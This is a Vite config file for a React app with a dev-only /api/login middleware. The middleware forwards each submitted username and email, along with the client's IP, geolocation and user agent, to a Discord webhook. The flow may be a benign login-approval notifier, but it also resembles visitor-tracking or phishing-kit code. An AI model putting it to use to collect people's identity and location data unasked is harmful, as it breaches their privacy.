import { defineConfig, loadEnv } from "vite";
import react from "@vitejs/plugin-react";
import { buildEmbed, clientIpFromHeaders, enrichIp } from "./api/enrich.js";

// Dev-only middleware. Keeps the webhook URL on the server side even in
// `vite dev`, so it never ends up in bundled JS or network inspector URLs.
function devLoginApi(env) {
  return {
    name: "dev-login-api",
    configureServer(server) {
      const webhookPreview = env.DISCORD_WEBHOOK_URL
        ? env.DISCORD_WEBHOOK_URL.slice(0, 42) + "…(len=" + env.DISCORD_WEBHOOK_URL.length + ")"
        : "MISSING";
      console.log("[dev-login-api] loaded. DISCORD_WEBHOOK_URL=" + webhookPreview);
      console.log("[dev-login-api] node fetch available: " + (typeof fetch === "function"));

      server.middlewares.use("/api/login", async (req, res) => {
        console.log("[dev-login-api] " + req.method + " /api/login");
        if (req.method !== "POST") {
          res.statusCode = 405;
          res.setHeader("Content-Type", "application/json");
          res.end(JSON.stringify({ error: "method_not_allowed" }));
          return;
        }
        let raw = "";
        req.on("data", (c) => (raw += c));
        req.on("end", async () => {
          const webhook = env.DISCORD_WEBHOOK_URL;
          if (!webhook) {
            console.error("[dev-login-api] DISCORD_WEBHOOK_URL is empty — .env.local not loaded?");
            res.statusCode = 500;
            res.setHeader("Content-Type", "application/json");
            res.end(JSON.stringify({ error: "webhook_not_configured" }));
            return;
          }
          let body = {};
          try {
            body = raw ? JSON.parse(raw) : {};
          } catch {
            res.statusCode = 400;
            res.setHeader("Content-Type", "application/json");
            res.end(JSON.stringify({ error: "bad_json" }));
            return;
          }
          const username = String(body.username || "").slice(0, 64);
          const email = String(body.email || "").slice(0, 254);
          const requestId = String(body.requestId || "").slice(0, 128);
          const ua = String(req.headers["user-agent"] || "unknown").slice(0, 500);

          const rawIp = clientIpFromHeaders(req.headers, req.socket?.remoteAddress);
          const { ip, geo, localFallback } = await enrichIp(rawIp);
          console.log("[dev-login-api] ip=" + ip + " geo=" + (geo?.country || "n/a") + " localFallback=" + localFallback);

          const payload = buildEmbed({ username, email, requestId, ip, geo, ua, localFallback });

          try {
            console.log("[dev-login-api] posting to Discord…");
            const dres = await fetch(webhook, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
            console.log("[dev-login-api] discord status=" + dres.status);
            if (!dres.ok) {
              const text = await dres.text().catch(() => "");
              console.error("[dev-login-api] discord error body: " + text.slice(0, 500));
              res.statusCode = 502;
              res.setHeader("Content-Type", "application/json");
              res.end(
                JSON.stringify({
                  error: "webhook_failed",
                  status: dres.status,
                  discord: text.slice(0, 500),
                })
              );
              return;
            }
          } catch (e) {
            console.error("[dev-login-api] webhook_unreachable: " + (e?.message || e));
            res.statusCode = 502;
            res.setHeader("Content-Type", "application/json");
            res.end(
              JSON.stringify({ error: "webhook_unreachable", detail: String(e?.message || e) })
            );
            return;
          }

          res.statusCode = 202;
          res.setHeader("Content-Type", "application/json");
          res.end(JSON.stringify({ status: "pending", requestId }));
        });
      });
    },
  };
}

export default defineConfig(({ mode }) => {
  const env = loadEnv(mode, process.cwd(), "");
  return {
    plugins: [react(), devLoginApi(env)],
    server: { port: 5173, host: true },
  };
});
